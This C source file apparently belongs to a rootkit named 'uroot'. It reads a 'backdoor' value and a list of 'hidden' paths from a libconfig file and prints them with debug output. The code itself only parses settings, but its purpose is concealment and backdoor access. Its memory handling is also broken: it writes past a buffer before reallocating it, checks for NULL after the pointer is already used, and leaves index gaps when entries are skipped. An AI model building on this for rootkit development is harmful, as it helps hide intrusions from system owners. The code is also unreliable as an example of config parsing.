#include <libconfig.h>
#include <stdlib.h>
#include <stdio.h>

#define DEBUG 1

struct Config {
  const char** hidden;
  const char* backdoor;
  int hidden_count; 
};

char* CONFIG_FILE = "uroot.cfg";

int debug_file(char* str){
  if(DEBUG){
    printf("[UROOT-DEBUG] %s\n", str);
    return 0;
  }
  return 1;
}

int init_cfg(struct Config* cfg){
  cfg->hidden = (const char**)malloc(sizeof(char*)); 

  if (cfg == NULL || cfg->hidden == NULL){
    debug_file("error allocating config");
    return -1;
  }

  return 0;
}

void clean_cfg(struct Config* cfg){
  free(cfg->hidden);
}

int read_cfg(struct Config* cfg){
  config_t lcfg;
  config_setting_t *hidden;
  config_init(&lcfg);

  if(!config_read_file(&lcfg, CONFIG_FILE)){
    debug_file("error reading config");
    config_destroy(&lcfg);
    return -1;
  }

  const char* backdoor;
  if(!config_lookup_string(&lcfg, "backdoor", &backdoor)){
    debug_file("error reading backdoor");
    config_destroy(&lcfg);
    return -1;
  }
  cfg->backdoor = backdoor;
  printf("backdoor %s\n", backdoor);
  printf("backdoor2: %s\n", cfg->backdoor);

  hidden = config_lookup(&lcfg, "hidden");
  if (hidden == NULL){
    debug_file("error reading hidden");
    config_destroy(&lcfg);
    return -1;
  }

  unsigned int hiddenlen  = config_setting_length(hidden);
  unsigned int actuallen = 0;
    printf("hidden: %d\n", hiddenlen);
  for (int i = 0; i < hiddenlen; i++){
    config_setting_t* hp = config_setting_get_elem(hidden, i); 
    const char* path;

    if(!config_setting_lookup_string(hp, "path", &path)){
      continue;
    }
    printf("path: %s\n", path);

    cfg->hidden[i] = path;
    printf("path2: %s\n", path);
    cfg->hidden = (const char**)realloc(cfg->hidden, (i+1)*sizeof(const char*));
    printf("path3: %s\n", path);
    actuallen += 1;
  }

  cfg->hidden_count = actuallen; 
  return 0;
}

// int init_cfg(struct Config* cfg){
//   cfg->hidden = (const char**)malloc(sizeof(char*)); 

//   if (cfg == NULL || cfg->hidden == NULL){
//     debug_file("error allocating config");
//     return -1;
//   }

//   return 0;
// }

int main() {
    struct Config config;
    init_cfg(&config);
    read_cfg(&config);

    printf("backdoor: %s\n", config.backdoor);
    printf("hidden_count: %d\n", config.hidden_count);
    printf("hidden:\n");
    for (int i = 0; i < config.hidden_count; ++i) {
        printf("  %s\n", config.hidden[i]);
    }

    return 0;
}